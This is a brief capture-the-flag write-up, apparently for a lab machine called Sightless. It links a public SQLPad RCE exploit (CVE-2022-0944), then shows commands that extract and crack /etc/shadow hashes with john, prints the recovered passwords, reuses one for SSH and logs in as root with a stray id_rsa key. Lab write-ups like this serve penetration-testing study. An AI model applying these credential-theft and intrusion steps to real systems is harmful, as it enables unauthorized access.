# sightless
## initial foothold

on the website sightless.htb we can see sqlpad.sightless.htb
We can see this is a SQLPad and there is a CVE 
```
https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944
```
after exploiting this cve we are root on a docker container 
we can extract /etc/shadow and /etc/passwd to crack some credentials
to do so we need to copy thoses 2 files and use 
```
unshadow passwd shadow > unshadow
```
then 
```
john --wordlist=/usr/share/wordlists/rockyou.txt unshadow
``` 
we get 
```
blindside        (root)
insaneclownposse (michael)
```
we can ssh as michael with the password reuse : insaneclownposse
```
ssh michael@sightless.htb
```

from here i usualy go to /tmp to upload linpeas.sh and here i found a id_rsa  so i copied it to my box and try some combinations
```
ssh -i id_rsa root@sightless.htb
```

we are root
